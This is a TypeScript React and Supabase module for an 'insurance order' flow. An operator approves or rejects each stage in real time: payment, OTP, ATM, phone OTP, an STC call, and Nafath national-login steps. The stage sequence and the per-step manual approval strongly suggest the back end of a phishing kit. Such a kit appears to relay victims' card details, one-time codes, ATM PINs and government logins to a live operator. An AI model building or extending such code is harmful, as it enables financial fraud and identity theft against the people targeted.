import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";

type Stage = "payment" | "otp" | "atm" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
type StageStatus = "pending" | "approved" | "rejected";

export const useAdminApproval = (orderId: string | null, stage: Stage) => {
  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");

  useEffect(() => {
    if (!orderId) return;

    const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;

    const channel = supabase
      .channel(`order-stage-${orderId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "insurance_orders",
          filter: `id=eq.${orderId}`,
        },
        (payload: any) => {
          const row = payload.new;
          if (row.current_stage === stage) {
            if (row.stage_status === "approved") setStatus("approved");
            else if (row.stage_status === "rejected") setStatus("rejected");
          }
        }
      )
      .subscribe();

    const interval = setInterval(async () => {
      // Use secure RPC to read order status (bypasses RLS for anon users)
      if (visitorSid) {
        const { data } = await supabase.rpc("get_own_order", {
          p_visitor_session_id: visitorSid,
          p_order_id: orderId,
        });
        const order = data as any;
        if (order?.current_stage === stage) {
          if (order.stage_status === "approved") setStatus("approved");
          else if (order.stage_status === "rejected") setStatus("rejected");
        }
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
    };
  }, [orderId, stage]);

  return status;
};

export const createOrUpdateStage = async (
  orderId: string | null,
  stage: Stage,
  extraData?: Record<string, any>
): Promise<string | null> => {
  const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;

  const stageData: Record<string, any> = {
    current_stage: stage,
    stage_status: "pending",
    ...extraData,
  };
  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "pending";

  let resolvedOrderId = orderId;

  if (orderId) {
    // Use RPC for secure update
    const { error } = await supabase.rpc("upsert_insurance_order", {
      p_visitor_session_id: visitorSid || "",
      p_order_id: orderId,
      p_data: stageData,
    });
    if (error) throw error;
  } else {
    // Use RPC for secure insert
    const { data, error } = await supabase.rpc("upsert_insurance_order", {
      p_visitor_session_id: visitorSid || "",
      p_data: { status: "pending", ...stageData },
    });
    if (error) throw error;
    resolvedOrderId = data as string | null;
  }

  if (resolvedOrderId && visitorSid) {
    try {
      await supabase.rpc("insert_stage_event", {
        p_visitor_session_id: visitorSid,
        p_order_id: resolvedOrderId,
        p_stage: stage,
        p_status: resolvedStageStatus,
        p_payload: extraData ?? {},
      });
    } catch (error) {
      // Stage event persistence failed silently
    }
  }

  return resolvedOrderId;
};
